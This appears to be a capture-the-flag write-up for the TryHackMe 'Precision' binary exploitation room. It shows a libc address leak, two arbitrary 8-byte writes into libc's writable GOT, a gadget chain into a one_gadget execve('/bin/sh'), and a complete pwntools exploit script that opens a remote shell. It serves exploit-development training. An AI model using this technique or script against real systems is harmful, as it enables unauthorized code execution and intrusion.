# [Precision](https://tryhackme.com/room/hfb1precision)

## Practice your advanced Linux Exploit Development skills.

Thanks to a tip, we are in possession of the file responsible for one of the most precise cracking tools of Void. Help us to find a vulnerability and exploit the service to get access to Void's system.

To start the lab machine, click the Start Lab Machine button.

Access the machine on the following IP and Port:
<TARGET_IP> 9004

You can download the Dockerfile to debug [here](https://drive.google.com/file/d/1fSkRxL4czlr2CTPbthURz2IwyGV-b1Tx/view?usp=drive_link).
You can download the files [here](https://drive.google.com/file/d/1dDfLG1AQXo4xwy-kcPL1Y1d8Zjaf2e8n/view?usp=sharing).

_This challenge was originally a part of the Hackfinity Battle 2025 CTF Event._

1. Open `precision` in Binary Ninja to understand the program flow
   - `main` leaks `stdout`'s runtime address via `printf("\nCoordinates: %p\n", stdout)`. Since `stdout` is a symbol inside `libc.so.6`, this breaks ASLR and gives us a libc base address
   - `getint()` reads a decimal number from stdin and returns it as a 64-bit integer; it is protected with a stack canary, so a direct buffer overflow there is not viable
   - After each call to `getint()`, `main` calls `fread(buf, 8, 1, stdin)` where `buf` is whatever integer `getint()` returned. This is a **write-what-where primitive**: we supply an arbitrary target address, then write exactly 8 bytes to it
   - We have this primitive **twice**, which is exactly enough to overwrite two 8-byte entries anywhere in writable memory
   - After both writes, `perror("!")` is called before `_exit`. This is our execution trigger, as it internally calls `strlen` through libc's own GOT

```c
00401326    int32_t main(int32_t argc, char** argv, char** envp)

00401326    {
00401326        setup();
00401355        printf("\nCoordinates: %p\n", stdout);
0040135f        uint64_t buf = getint();
0040137c        write(1, "\nFirst chance: ", 0xf);
0040139c        fread(buf, 8, 1, stdin);
004013a6        uint64_t buf_1 = getint();
004013c3        write(1, "\nSecond chance: ", 0x10);
004013e3        fread(buf_1, 8, 1, stdin);
004013f2        perror("!");
004013fc        _exit(0x539);
004013fc        /* no return */
00401326    }
```

```c
004012ae    uint64_t getint()

004012ae    {
004012ae        void* fsbase;
004012ba        int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
004012dd        write(1, "\n>> ", 4);
004012f5        char var_58[0x48];
004012f5        fgets(&var_58, 0x40, stdin);
0040130b        uint64_t result = strtoul(&var_58, nullptr, 0xa);
00401314        *(uint64_t*)((char*)fsbase + 0x28);
00401314
0040131d        if (rax == *(uint64_t*)((char*)fsbase + 0x28))
00401325            return result;
00401325
0040131f        __stack_chk_fail();
0040131f        /* no return */
004012ae    }
```

2. Use `pwndbg` to enumerate `libc.so.6`'s own internal GOT and identify writable overwrite targets
   - The binary is compiled with Partial RELRO, so the binary's own GOT is read-only. We cannot overwrite it directly.
   - However, `libc.so.6` itself is also loaded with Partial RELRO, meaning **libc's internal GOT is writable at runtime**
   - Libc dispatches many of its own internal calls through its own GOT section, not through the binary's PLT. Overwriting those entries hijacks execution the next time libc calls that function internally
   - `got -p libc.so.6` in pwndbg lists all GOT entries belonging to libc's own mapping; the two entries we will target are `__strlen_avx2` and `__mempcpy_avx_unaligned_erms`
   - Note: the addresses below are from a local debug run; the challenge's Docker `libc.so.6` has `__strlen_avx2` at GOT offset `0x219098` and `__mempcpy_avx_unaligned_erms` at `0x219040` from libc base

```bash
gdb ./precision
b *main
got -p libc.so.6
```

**Results:**

```
Filtering by lib/objfile path: libc.so.6
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/kali/precision/libc.so.6:
GOT protection: Partial RELRO | Found 54 GOT entries passing the filter
[0x7ffff7e19018] *ABS*+0x0 -> 0x7ffff7d9dae0 (__strnlen_avx2) ◂— endbr64
[0x7ffff7e19020] *ABS*+0x0 -> 0x7ffff7d99710 (__rawmemchr_avx2) ◂— endbr64
[0x7ffff7e19028] realloc -> 0x7ffff7c28030 ◂— endbr64
[0x7ffff7e19030] *ABS*+0x0 -> 0x7ffff7d9b930 (__strncasecmp_avx) ◂— endbr64
[0x7ffff7e19038] _dl_exception_create@GLIBC_PRIVATE -> 0x7ffff7c28050 ◂— endbr64
[0x7ffff7e19040] *ABS*+0x0 -> 0x7ffff7da0890 (__mempcpy_avx_unaligned) ◂— endbr64
[0x7ffff7e19048] *ABS*+0x0 -> 0x7ffff7da1050 (__wmemset_avx2_unaligned) ◂— endbr64
[0x7ffff7e19050] calloc -> 0x7ffff7c28080 ◂— endbr64
[0x7ffff7e19058] *ABS*+0x0 -> 0x7ffff7d98990 (__strspn_sse42) ◂— endbr64
[0x7ffff7e19060] *ABS*+0x0 -> 0x7ffff7d99440 (__memchr_avx2) ◂— endbr64
[0x7ffff7e19068] *ABS*+0x0 -> 0x7ffff7da08b0 (__memmove_avx_unaligned) ◂— endbr64
[0x7ffff7e19070] *ABS*+0x0 -> 0x7ffff7da1640 (__wmemchr_avx2) ◂— endbr64
[0x7ffff7e19078] *ABS*+0x0 -> 0x7ffff7d9fb20 (__stpcpy_avx2) ◂— endbr64
[0x7ffff7e19080] *ABS*+0x0 -> 0x7ffff7da1240 (__wmemcmp_avx2_movbe) ◂— endbr64
[0x7ffff7e19088] _dl_find_dso_for_object@GLIBC_PRIVATE -> 0x7ffff7c280f0 ◂— endbr64
[0x7ffff7e19090] *ABS*+0x0 -> 0x7ffff7d9f1c0 (__strncpy_avx2) ◂— endbr64
[0x7ffff7e19098] *ABS*+0x0 -> 0x7ffff7d9d960 (__strlen_avx2) ◂— endbr64
[0x7ffff7e190a0] *ABS*+0x0 -> 0x7ffff7d9a2c4 (__strcasecmp_l_avx) ◂— endbr64
[0x7ffff7e190a8] *ABS*+0x0 -> 0x7ffff7d9ee30 (__strcpy_avx2) ◂— endbr64
[0x7ffff7e190b0] *ABS*+0x0 -> 0x7ffff7da22c0 (__wcschr_avx2) ◂— endbr64
[0x7ffff7e190b8] *ABS*+0x0 -> 0x7ffff7d9d580 (__strchrnul_avx2) ◂— endbr64
[0x7ffff7e190c0] *ABS*+0x0 -> 0x7ffff7d99880 (__memrchr_avx2) ◂— endbr64
[0x7ffff7e190c8] _dl_deallocate_tls@GLIBC_PRIVATE -> 0x7ffff7c28170 ◂— endbr64
[0x7ffff7e190d0] __tls_get_addr@GLIBC_2.3 -> 0x7ffff7c28180 ◂— endbr64
[0x7ffff7e190d8] *ABS*+0x0 -> 0x7ffff7da1050 (__wmemset_avx2_unaligned) ◂— endbr64
[0x7ffff7e190e0] *ABS*+0x0 -> 0x7ffff7d99c00 (__memcmp_avx2_movbe) ◂— endbr64
[0x7ffff7e190e8] *ABS*+0x0 -> 0x7ffff7d9b944 (__strncasecmp_l_avx) ◂— endbr64
[0x7ffff7e190f0] _dl_fatal_printf@GLIBC_PRIVATE -> 0x7ffff7c281c0 ◂— endbr64
[0x7ffff7e190f8] *ABS*+0x0 -> 0x7ffff7d9ddb0 (__strcat_avx2) ◂— endbr64
[0x7ffff7e19100] *ABS*+0x0 -> 0x7ffff7d927a0 (__wcscpy_ssse3) ◂— endbr64
[0x7ffff7e19108] *ABS*+0x0 -> 0x7ffff7d98730 (__strcspn_sse42) ◂— endbr64
[0x7ffff7e19110] *ABS*+0x0 -> 0x7ffff7d9a2b0 (__strcasecmp_avx) ◂— endbr64
[0x7ffff7e19118] *ABS*+0x0 -> 0x7ffff7d98f00 (__strncmp_avx2) ◂— endbr64
[0x7ffff7e19120] *ABS*+0x0 -> 0x7ffff7da1640 (__wmemchr_avx2) ◂— endbr64
[0x7ffff7e19128] *ABS*+0x0 -> 0x7ffff7d9fed0 (__stpncpy_avx2) ◂— endbr64
[0x7ffff7e19130] *ABS*+0x0 -> 0x7ffff7da1930 (__wcscmp_avx2) ◂— endbr64
[0x7ffff7e19138] _dl_audit_symbind_alt@GLIBC_PRIVATE -> 0x7ffff7c28250 ◂— endbr64
[0x7ffff7e19140] *ABS*+0x0 -> 0x7ffff7da08b0 (__memmove_avx_unaligned) ◂— endbr64
[0x7ffff7e19148] *ABS*+0x0 -> 0x7ffff7d9d790 (__strrchr_avx2) ◂— endbr64
[0x7ffff7e19150] *ABS*+0x0 -> 0x7ffff7d9d300 (__strchr_avx2) ◂— endbr64
[0x7ffff7e19158] *ABS*+0x0 -> 0x7ffff7da22c0 (__wcschr_avx2) ◂— endbr64
[0x7ffff7e19160] *ABS*+0x0 -> 0x7ffff7da08b0 (__memmove_avx_unaligned) ◂— endbr64
[0x7ffff7e19168] _dl_rtld_di_serinfo@GLIBC_PRIVATE -> 0x7ffff7c282b0 ◂— endbr64
[0x7ffff7e19170] _dl_allocate_tls@GLIBC_PRIVATE -> 0x7ffff7c282c0 ◂— endbr64
[0x7ffff7e19178] __tunable_get_val@GLIBC_PRIVATE -> 0x7ffff7fdadd0 (__tunable_get_val) ◂— endbr64
[0x7ffff7e19180] *ABS*+0x0 -> 0x7ffff7da2740 (__wcslen_avx2) ◂— endbr64
[0x7ffff7e19188] *ABS*+0x0 -> 0x7ffff7da1080 (__memset_avx2_unaligned) ◂— endbr64
[0x7ffff7e19190] *ABS*+0x0 -> 0x7ffff7da2940 (__wcsnlen_avx2) ◂— endbr64
[0x7ffff7e19198] *ABS*+0x0 -> 0x7ffff7d98ac0 (__strcmp_avx2) ◂— endbr64
[0x7ffff7e191a0] _dl_allocate_tls_init@GLIBC_PRIVATE -> 0x7ffff7c28320 ◂— endbr64
[0x7ffff7e191a8] __nptl_change_stack_perm@GLIBC_PRIVATE -> 0x7ffff7c28330 ◂— endbr64
[0x7ffff7e191b0] *ABS*+0x0 -> 0x7ffff7d98870 (__strpbrk_sse42) ◂— endbr64
[0x7ffff7e191b8] _dl_audit_preinit@GLIBC_PRIVATE -> 0x7ffff7fde680 (_dl_audit_preinit) ◂— endbr64
[0x7ffff7e191c0] *ABS*+0x0 -> 0x7ffff7d9dae0 (__strnlen_avx2) ◂— endbr64
```

3. Set a breakpoint at `__strlen_avx2` to observe the register state when `perror` triggers `strlen`
   - From the GOT output above, the value stored at the `__strlen_avx2` GOT entry is `0x7ffff7d9d960`. That is the actual function address; we break there to intercept any call to strlen through libc's GOT
   - Provide dummy writable addresses for the two `fread` prompts so the program reaches `perror("!")` without crashing
   - `perror` formats its output by calling `strerror(errno)` and then measuring the string length with `strlen`. This call arrives at `__strlen_avx2`
   - The critical observation from the register dump: **R12 = 0** and **RSI = 0**, but **RDX = 0x33**. The one_gadget we intend to use requires `[rdx] == NULL`, so we need a first-stage gadget that zeroes rdx before the one_gadget runs

```bash
b *0x7ffff7d9d960
c
```

**Results:**

```
Breakpoint 2, __strlen_avx2 () at ../sysdeps/x86_64/multiarch/strlen-avx2.S:50
⚠️ warning: 50   ../sysdeps/x86_64/multiarch/strlen-avx2.S: No such file or directory
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────
*RAX  0x7ffff7dda1d7 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* 'C' */
*RBX  0x7ffff7dda1d7 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* 'C' */
*RCX  0
*RDX  0x33
*RDI  0x7ffff7dd850a (_libc_intl_domainname) ◂— 0x534f50006362696c /* 'libc' */
*RSI  0
*R8   0x7ffff7e1ad20 (tree_lock) ◂— 0
*R9   0
*R10  0xfffffffffffff000
*R11  0x7ffff7e19ce0 (main_arena+96) —▸ 0x55555555c470 —▸ 0x7ffff7e160c0 (__GI__IO_wfile_jumps) ◂— 0
*R12  0
*R13  0x7ffff7dd850a (_libc_intl_domainname) ◂— 0x534f50006362696c /* 'libc' */
*R14  0x7ffff7dd89aa ◂— 'Bad address'
*R15  0x7ffff7dbd493 (_nl_category_names+51) ◂— 'LC_MESSAGES'
*RBP  0x7fffffffd860 —▸ 0x55555555c2a0 ◂— 0xfbad2480
*RSP  0x7fffffffd758 —▸ 0x7ffff7c3b6f4 (__dcigettext+436) ◂— mov rdi, r15
*RIP  0x7ffff7d9d960 (__strlen_avx2) ◂— endbr64
```

4. Run `one_gadget` on the challenge libc to find a usable `execve` gadget and understand its constraints
   - `one_gadget` scans `libc.so.6` for short sequences that call `execve("/bin/sh", ...)` and lists the register/memory constraints that must hold at the moment of execution
   - The gadget at offset `0xebcf8` is the best candidate: it requires `[rsi] == NULL` and `[rdx] == NULL`
   - We need a first-stage gadget that zeros rdx before transferring control to this one_gadget

```bash
one_gadget ./libc.so.6
```

**Results:**

```
0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

5. Find a gadget inside libc that zeroes rdx using the already-null R12 and RSI, then chains to a second controllable GOT slot
   - `mov rdx, r12` -> rdx = R12 = 0
   - `sub rdx, rsi` -> rdx = 0 - 0 = 0. Both one_gadget constraints on rsi and rdx are now satisfied
   - `call 0x283e0` is a relative call whose target resolves to libc offset `0x283e0`, which corresponds to the `__mempcpy_avx_unaligned_erms` GOT slot. This is the second GOT entry we overwrite with the one_gadget address
   - Full exploit chain: `perror` -> `strlen` -> `call libc+0x283e0` -> `execve("/bin/sh", 0, 0)` -> shell

```bash
ROPgadget --binary libc.so.6 | grep "mov rdx, r12"
```

**Results:**

```
0x0000000000176df7 : mov rdx, r12 ; sub rdx, rsi ; call 0x283e0
```

6. Write and run the exploit that delivers both GOT overwrites and drops an interactive shell
   - Parse the `stdout` address leak to compute `libc_base = leak - libc.symbols['_IO_2_1_stdout_']`
   - **First write**: send the address of the `__strlen_avx2` GOT entry inside the challenge libc as the target, then write the rdx-zeroing gadget address. The next call to `strlen` inside libc will execute this gadget instead
   - **Second write**: send the address of the `__mempcpy_avx_unaligned_erms` GOT entry as the target, then write the one_gadget address. The gadget's trailing `call 0x283e0` now lands on the one_gadget
   - `perror("!")` fires, the chain executes, and we get an interactive shell

```py
from pwn import *

binary = './precision'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = remote('<TARGET_IP>', 9004)

libc = ELF('./libc.so.6')

r.recvuntil(b'Coordinates: ')
leak = r.recvline().strip()
leak = int(leak, 16)
log.info(f'Leak: {hex(leak)}')
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
log.info(f'Libc base: {hex(libc_base)}')

libc.address = libc_base

__strlen_avx2 = libc_base + (0x7ffff7fac098 - 0x7ffff7d93000)
__mempcpy_avx_unaligned_erms = libc_base + (0x7ffff7fac040 - 0x7ffff7d93000)

r.sendlineafter(b'>> ', str(__strlen_avx2).encode())
r.send(p64(libc_base + 0x176df7))

r.sendlineafter(b'>> ', str(__mempcpy_avx_unaligned_erms).encode())
r.send(p64(libc_base + 0xebcf8))

r.interactive()
```

[SCREEN01]
